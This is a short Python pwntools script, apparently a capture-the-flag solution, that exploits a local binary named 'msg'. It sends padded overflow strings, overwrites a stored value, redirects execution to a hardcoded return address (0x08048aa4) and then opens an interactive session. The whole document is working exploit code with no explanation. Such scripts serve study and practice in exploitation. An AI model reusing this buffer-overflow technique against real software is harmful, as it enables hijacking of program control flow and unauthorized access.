from pwn import *

p = process("./msg")
print p.recv()
p.sendline("1")
print p.recv()
p.sendline("a"*252+p32(0x00000002))
print p.recv()
p.sendline("1")
print p.recvuntil("Msg ID : ")
msgid = p.recvline()
print msgid
print p.recv()
ret = p32(0x08048aa4)
p.sendline(" !"+"a"*(276-2-len('This string is invalid string... : '))+ret)
# return to sub_8048aa4() ; maybe 'msg : ' is printed
print p.recv()
p.sendline("3")
print p.recv()
p.sendline(msgid)
p.interactive()
